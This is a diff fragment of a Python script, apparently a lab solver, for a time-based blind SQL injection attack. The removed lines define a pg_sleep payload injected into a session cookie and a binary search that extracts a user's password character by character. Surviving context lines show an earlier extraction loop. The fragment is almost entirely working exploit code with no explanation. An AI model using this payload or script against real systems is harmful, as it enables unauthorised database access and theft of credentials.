@@ -96,30 +96,3 @@ for i in range(1,passwordLen+1):
 	print(f"[{i}]->{vulPassword}")
 print(f"[+] password -> {vulPassword}")
 
-def is_char(operator, ascii_val, pos):
-    payload = f"'; SELECT CASE WHEN (username='{valid_user}' AND ascii(substr(password,{pos},1)){operator}{ascii_val}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users--"
-    test_cookie = cookie_dict.copy()
-    test_cookie[vuln_cookie] += urllib.parse.quote(payload)
-    t1 = time.time()
-    session.get(url, cookies=test_cookie, verify=False, proxies=proxies, headers=headers)
-    t2 = time.time()
-    return (t2 - t1) > threshold
-
-def binary_search(pos):
-    low = 0
-    high = len(charset) - 1
-    while low <= high:
-        mid = (low + high) // 2
-        ascii_val = ord(charset[mid])
-        if is_char('<', ascii_val, pos):
-            high = mid - 1
-        elif is_char('>', ascii_val, pos):
-            low = mid + 1
-        else:
-            return charset[mid]
-    return '?'
-
-for i in range(1, password_length + 1):
-    char = binary_search(i)
-    password += char
-    print(f"[{i}] -> {password}")
